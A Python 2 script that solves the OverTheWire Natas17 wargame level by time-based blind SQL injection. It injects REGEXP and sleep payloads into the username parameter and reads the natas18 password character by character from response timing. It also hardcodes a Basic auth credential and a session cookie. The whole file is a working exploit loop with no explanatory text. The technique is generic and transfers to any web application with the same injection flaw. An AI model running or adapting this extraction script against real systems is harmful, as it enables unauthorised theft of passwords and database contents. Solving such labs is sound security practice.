#!/usr/bin/python
import urllib
import urllib2
import time

KEYSLAP={
'A-G':'ABCDEFG',
'H-N':'HIJKLMN',
'O-U':'OPQRSTU',
'V-Z':'VWXYZ',
'a-g':'abcdefg',
'h-n':'hijklmn',
'o-u':'opqrstu',
'v-z':'vwxyz',
'0-4':'01234',
'5-9':'56789',
}



# generate request
def generate_request(URL, Data):
    url = URL
    url += urllib.urlencode({'debug':'true', 'username': Data})
    req = urllib2.Request(url)
    req.add_header('User-Agent', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0')
    req.add_header('Authorization', 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==')
    req.add_header('Cookie', '__cfduid=d343ee483747c1158b3dd095b778a57ff1549137174') 
    start = time.time()
    req = urllib2.urlopen(req).read()
    stop = time.time()
    return (req, stop-start)



# main function
def main():
    KEY = ''
    URL = 'http://natas17.natas.labs.overthewire.org/index.php?'
    Data = 'natas18" and if(password REGEXP BINARY \"^{}[{}]\", sleep(2), null)#' 
    for _ in range(32):
        for k,v in KEYSLAP.iteritems():
            req = generate_request(URL, Data.format(KEY, k))
            if float(req[1])>1.8:
                for i in v:
                    req = generate_request(URL, Data.format(KEY, i))
                    if float(req[1])>1.8:
                        KEY += i
                    print "     [*] Trying : {} | Key : {}".format(i, KEY)
                print "[*] One Cycle Over"
            print "[*] Trying : {} | Key : {}".format(k, KEY)
    return


if __name__=='__main__':
    main()
